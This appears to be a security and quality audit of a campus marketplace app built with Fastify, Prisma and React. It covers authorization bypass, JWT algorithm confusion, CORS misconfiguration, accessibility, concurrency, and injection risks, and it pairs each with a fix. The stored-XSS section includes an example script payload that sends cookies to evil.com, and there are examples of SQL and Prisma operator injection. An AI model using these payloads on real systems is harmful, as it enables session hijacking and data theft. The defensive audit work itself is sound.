Top 3 Most Dangerous Issues
The following three issues represent the highest combined likelihood and impact of exploitation or 
production failure. They must be treated as zero-tolerance blockers.
1. [P0-SEC-001] Admin Route Authorization Bypass — If admin access control is enforced only 
at the React router/layout level and not as server-side middleware on every Fastify route, 
any authenticated student can directly call /admin/stats, /admin/users/:id, and dispute 
resolution endpoints by crafting raw HTTP requests. This grants full governance access to 
any student account. Fix: Apply a verifyAdmin middleware to every admin-prefixed Fastify 
route, checking role === 'ADMIN' from the verified JWT payload server-side.
2. [P0-SEC-004] JWT Algorithm Confusion (RS256 rightarrow HS256 Downgrade) — If the 
Fastify JWT plugin is configured to accept multiple algorithms or does not explicitly pin the 
algorithm, an attacker can forge a valid JWT by signing it with HS256 using the server's 
Built with Spine AI on 2026-03-31 3
RS256 public key as the HMAC secret. This results in complete authentication bypass and arbitrary identity impersonation. 
Fix: Pin algorithm explicitly in @fastify/jwt config: { algorithms: ['RS256'] } and reject any token with a different alg header.
3. [P0-SEC-007] CORS Wildcard with Credentials — If @fastify/cors is configured with origin: '*' 
and credentials: true, any malicious website can make authenticated cross-origin requests on 
behalf of a logged-in student, enabling CSRF-equivalent attacks against all authenticated 
endpoints including listing creation, exchange requests, and trust score manipulation. Fix: 
Whitelist only https://rgitrozgar.in and https://www.rgitrozgar.in in the CORS origin array.

1.1 Public User Journey
The public user experience begins at the landing/splash page and terminates at the authentication 
wall. The following findings were identified across the unauthenticated flow.
1.1.1 Landing & Splash Page Load Behavior
The cinematic GSAP/WebGL fluid-mask reveal is a high-risk performance decision for a campus 
platform where a significant portion of users will be on mid-range Android devices with 3G or 4G 
connections. The following failure modes are identified:
• On 3G connections (RTT ~400ms, bandwidth ~1.5Mbps), the WebGL shader assets and 
GSAP timeline scripts may take 4–8 seconds to load. If the reveal animation is gated on 
asset load completion, the user sees a blank or partially rendered screen for this entire 
duration with no loading indicator.
• There is no identified fallback for devices where WebGL context creation fails (iOS Safari 
limits WebGL contexts to 8 per page; low-end Android devices may refuse context creation 
under memory pressure). If WebGL init fails silently, the splash may render as a black 
canvas with no content visible.
• The GSAP timeline, if not configured with a reduced-motion media query check, will play the 
full cinematic sequence for users with vestibular disorders who have enabled 
prefers-reduced-motion — a WCAG 2.1 Level AA violation.
• If the splash animation blocks pointer events during playback (a common GSAP pattern 
using pointer-events: none on the overlay), users on slow connections cannot skip or interact 
with the page for the full animation duration — potentially 3–6 seconds of forced inactivity.

1.1.2 Authentication Wall Enforcement
The most critical question for the auth wall is whether route protection is enforced server-side (API 
returns 401) or only client-side (React Router redirects). Client-side-only protection is trivially 
bypassed by disabling JavaScript or directly calling API endpoints.
• If /listings, /profile, and /marketplace routes are protected only by a React Router guard (e.g., 
a PrivateRoute component that checks localStorage for a JWT), an attacker can call the 
underlying API endpoints directly without a token. The protection is cosmetic.
• The timing of the token check matters: if the PrivateRoute component renders the protected 
component for one render cycle before the auth check resolves (a common async state bug), 
protected content flashes briefly before redirect — a UI information leak.

the router layer. See P0-SEC-001.

1.2 Verified Student Journey
1.2.1 Listing Creation & Draft Management
• If a student navigates away mid-draft (e.g., closes the tab, navigates to another module), the 
DRAFT state is lost unless auto-save is implemented. There is no evidence of auto-save or 
draft persistence in the documented workflows. The student must restart the listing creation 
from scratch.
• If the listing submission API call fails mid-flight (network drop after the request is sent but 
before the server responds), the student may see an error state but the DRAFT may have 
been created server-side. On retry, a duplicate DRAFT is created unless idempotency keys 
are validated server-side with a sufficient TTL.
• Form validation must occur both client-side (immediate feedback) and server-side 
(authoritative). If only client-side validation exists, a student can submit malformed data via 
direct API call.

2.3 Tap Targets & Accessibility
WCAG 2.5.5 requires a minimum tap target size of 44x44px for all interactive elements. The 
following elements are likely to fail this requirement based on common Tailwind CSS default sizing 
patterns:
• Icon-only buttons in listing cards (favorite, share, report) — typically rendered as 24x24px 
icons with no padding
• Pagination controls — previous/next arrows often rendered as small inline elements
• Admin queue approve/reject action buttons in compact table rows — often 32px height in 
dense table layouts
• Dropdown filter selectors in the marketplace — native select elements on iOS have adequate 
tap targets, but custom Tailwind dropdowns may not
• OTP digit input fields — if rendered as individual character inputs, each must be at least 
44x44px

3.3 Idempotency, Locking & Isolation Analysis
• Idempotency Keys: If idempotency keys are validated only in-memory (e.g., a Node.js Map 
or Redis cache), they are lost on server restart and do not protect against concurrent 
requests hitting different server instances. Keys must be persisted in PostgreSQL with a 
unique constraint on (key, userId) and a TTL enforced by a cleanup job.
• Optimistic Locking in Prisma: Prisma does not implement optimistic locking natively. It must 
be manually implemented using a version integer field: fetch the record, check version 
matches, update with WHERE version = $fetched_version. If the version check is omitted on 
any update path, concurrent writes silently overwrite each other.
• PostgreSQL Isolation Level: Prisma uses READ COMMITTED by default. Under READ 
COMMITTED, two concurrent transactions can both read the same listing as APPROVED 
and both attempt to transition it — the second write wins silently without error unless a 
DB-level constraint or optimistic lock is in place. For FSM-critical transitions, use 
SERIALIZABLE isolation or advisory locks.
• Trust Score Atomicity: Trust score increments must use UPDATE users SET trust_score = 
trust_score + 1 WHERE id = $id — never SELECT score followed by UPDATE score = 
$score + 1. The latter is a read-modify-write anti-pattern that loses updates under 
concurrency.

PHASE 7 — SECURITY TESTING (OWASP TOP 10:2025)
7.1 Injection (A03)
Prisma's query builder is parameterized by default and protects against standard SQL injection. 
However, two specific attack surfaces require explicit investigation:
• prisma.$queryRaw and prisma.$executeRaw with string interpolation: If any search, filter, or 
admin query uses raw SQL with template literals (e.g., prisma.$queryRaw`SELECT * FROM 
listings WHERE title LIKE '%${userInput}%'`), this is a direct SQL injection vulnerability. The 
safe pattern is prisma.$queryRaw`SELECT * FROM listings WHERE title LIKE ${'%' + 
userInput + '%'}` using Prisma's tagged template parameterization.
• Stored XSS via listing fields: If listing title, description, or category fields are rendered in the 
admin console or student dashboard via dangerouslySetInnerHTML, or if they are inserted 
into the DOM via innerHTML in any GSAP animation callback, stored XSS is possible. A 
malicious student submits a listing with title: 
'<script>document.location="https://evil.com/steal?c="+document.cookie</script>' — if 
rendered unsanitized in the admin moderation queue, the admin's session is hijacked.
• Object injection in Prisma where clauses: If search parameters are passed directly as objects 
to Prisma (e.g., prisma.listing.findMany({ where: req.query })), an attacker can inject Prisma 
operators like { status: { not: 'REJECTED' } } to bypass filters.
